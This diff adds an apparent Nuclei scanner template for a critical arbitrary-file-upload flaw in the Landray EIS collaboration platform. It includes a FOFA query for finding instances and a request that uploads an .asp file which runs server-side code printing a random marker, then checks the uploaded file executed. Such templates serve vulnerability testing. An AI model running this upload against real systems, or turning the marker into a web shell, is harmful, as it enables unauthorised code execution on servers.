@@ -1,0 +1,46 @@
+id: landray-eis-saveImg-upload
+info:
+  name: landray-eis-saveImg-upload
+  author: sb
+  severity: critical
+  metadata:
+    fofa-query: body="欢迎登录智慧协同平台"
+
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+  boundary: "{{rand_base(16)}}"
+  s1: '{{rand_base(5, "56789")}}'
+
+
+http:
+  - raw:
+      - |
+        POST /eis/service/api.aspx?action=saveImg HTTP/1.1
+        Accept-Encoding: gzip, deflate
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{boundary}}
+        
+        ------WebKitFormBoundary{{boundary}}
+        Content-Disposition: form-data; name="file"filename="{{filename}}.asp"
+        Content-Type: text/html
+        
+        <% response.write("{{s1}}")%>
+        ------WebKitFormBoundary{{boundary}}--
+
+      - |
+        GET /files/editor_img/{{aspfilenammme}} HTTP/1.1
+    
+    extractors:
+      - type: regex
+        part: body
+        name: aspfilenammme
+        group: 1
+        internal: true
+        regex:
+          - '/files/editor_img/([0-9-a-z]+/\w+\.asp)' 
+    req-condition: true
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code==200 && contains(body_1,"editor_img") && contains(body_2,"{{s1}}")'
